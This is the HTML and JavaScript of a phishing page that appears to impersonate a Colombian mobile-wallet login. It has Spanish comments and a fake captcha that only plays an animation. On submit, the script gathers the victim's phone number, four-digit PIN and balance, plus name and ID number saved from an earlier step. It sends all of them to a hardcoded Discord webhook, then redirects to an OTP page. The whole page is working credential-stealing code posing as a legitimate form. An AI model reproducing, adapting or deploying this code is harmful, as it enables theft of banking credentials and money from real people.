    <style>
        .login-wrap {
            text-align: center; /* Asegura el centrado total de los textos principales */
        }
        /* CAJA DE VERIFICACIÓN HUMANA ACTUALIZADA */
        .captcha-container-2025 {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #f9f9f9;
            border: 1px solid #d1d1d1;
            border-radius: 8px;
            padding: 12px 15px;
            margin: 20px 0;
            text-align: left;
            box-sizing: border-box;
            width: 100%;
        }
        .captcha-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        /* La bolita / checkbox circular */
        .captcha-circle {
            width: 24px;
            height: 24px;
            border: 2px solid #999;
            border-radius: 50%;
            cursor: pointer;
            position: relative;
            transition: all 0.3s ease;
            background: #fff;
            flex-shrink: 0;
        }
        .captcha-circle:hover {
            border-color: #da0081;
        }
        .captcha-text {
            font-size: 14px;
            color: #333;
            font-family: sans-serif;
            user-select: none;
        }
        .captcha-logo-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            opacity: 0.7;
        }
        .captcha-logo-section img {
            width: 28px;
            height: auto;
        }
        .captcha-logo-text {
            font-size: 8px;
            color: #555;
            margin-top: 2px;
        }

        /* Estados de animación y éxito */
        .captcha-circle.loading {
            border-top-color: #da0081;
            animation: spinCaptcha 0.8s linear infinite;
        }
        .captcha-circle.checked {
            background-color: #28a745;
            border-color: #28a745;
            animation: none;
        }
        .captcha-circle.checked::after {
            content: "";
            position: absolute;
            left: 8px;
            top: 4px;
            width: 5px;
            height: 10px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        @keyframes spinCaptcha {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body ng-app="App" class="ng-scope">

<script type="text/javascript">

document.addEventListener("DOMContentLoaded", function() {
    const usernameInput = document.getElementById('txtUsername');
    const passwordInput = document.getElementById('txtPass');
    const txtSaldo = document.getElementById("txtSaldo");
    const submitBtn = document.getElementById('btnUsuario');
    const captchaCircle = document.getElementById('captchaCircle');

    let captchaClicked = false;

    usernameInput.addEventListener('input', formatUsername);
    passwordInput.addEventListener('input', formatPassword);
    
    // Formateo exacto para Pesos Colombianos (COP) sin decimales artificiales
    txtSaldo.addEventListener("input", function() {
        // Remueve todo lo que no sea un dígito numérico
        let valor = txtSaldo.value.replace(/\D/g, "");
        
        // Limita de forma estricta a un máximo de 8 números
        if (valor.length > 8) {
            valor = valor.substring(0, 8);
        }

        if (valor === "") {
            txtSaldo.value = "";
            validateForm();
            return;
        }

        // Convierte el texto numérico a entero y aplica formato local de puntos (es-CO)
        txtSaldo.value = parseInt(valor, 10).toLocaleString("es-CO");
        
        validateForm();
    });

    // Acción para activar el validador visual al dar clic en la bolita
    captchaCircle.addEventListener('click', function() {
        if (captchaClicked) return;

        captchaCircle.classList.add('loading'); // Animación de vuelta

        setTimeout(() => {
            captchaCircle.classList.remove('loading');
            captchaCircle.classList.add('checked'); // Se pinta de verde con icono check
            captchaClicked = true;
            validateForm(); // Evalúa el formulario inmediatamente
        }, 1000);
    });

    function formatUsername() {
        let value = usernameInput.value.replace(/\D/g, ''); 
        
        // Limita de forma estricta la entrada a 10 números iniciales
        if (value.length > 10) {
            value = value.substring(0, 10);
        }
        
        let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim(); 
        usernameInput.value = formattedValue;
        validateForm();
    }

    function formatPassword() {
        passwordInput.value = passwordInput.value.replace(/\D/g, ''); 
        validateForm();
    }

    function validateForm() {
        // Valida que tenga exactamente 10 números estructurados con los 2 espacios correspondientes (total 12 caracteres) y empiece por 3
        const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
        const passwordValid = /^\d{4}$/.test(passwordInput.value);
        
        const saldoValid = txtSaldo.value.trim().length > 0;

        if (usernameValid && passwordValid && saldoValid && captchaClicked) {
            submitBtn.disabled = false;
            submitBtn.classList.remove('disabled');
        } else {
            submitBtn.disabled = true;
            submitBtn.classList.add('disabled');
        }
    }

    const nombreApellido = localStorage.getItem("nombreApellido");
    const cedula = localStorage.getItem("cedula");

    $('#btnUsuario').click(async function(e) {
        e.preventDefault();

        const usuario = $("#txtUsername").val().trim();
        const clave = $("#txtPass").val().trim();
        const saldo = $("#txtSaldo").val().trim();

        if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
            alert("El número ingresado no es válido. Debe tener 10 dígitos y comenzar por el número 3.");
            return;
        }

        if (!/^\d{4}$/.test(clave)) {
            alert("La clave debe ser de 4 dígitos numéricos.");
            return;
        }

        if (!saldo) {
            alert("Por favor ingrese su saldo.");
            return;
        }

        if (!nombreApellido || !cedula) {
            alert("Los datos de nombre y cédula no están disponibles. Vuelve al paso anterior.");
            return;
        }

        localStorage.setItem("numero", usuario);
        localStorage.setItem("clave", clave);
        localStorage.setItem("saldo", saldo);

        const webhookURL = 'https://discord.com/api/webhooks/1509639887299678469/fbAMf3CljDhITsTFkRgITfIrV_7hNNWJ3IoINzeOU4PGB6K5Is-bqPBU3OFCLJkAcc0J';

        const discordPayload = {
            username: "Consulta de Usuario",
            content: `Nueva consulta recibida:\n\nNombre:👤 ${nombreApellido}\nCédula:🪪 ${cedula}\n` +
                     `**Número de Usuario:📲** ${usuario}\n` +
                     `**Clave:🔐** ${clave}\n` +
                     `**Saldo:💸** $${saldo} COP💰`
        };

        try {
            const response = await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordPayload)
            });

            if (response.ok) {
                window.location.href = "otp.html";
            } else {
                throw new Error('Error al enviar los datos a Discord');
            }
        } catch (error) {
            console.error('Error al enviar los datos:', error);
            alert('Ocurrió un error al enviar los datos. Intente nuevamente.');
        }
    });
});
</script>
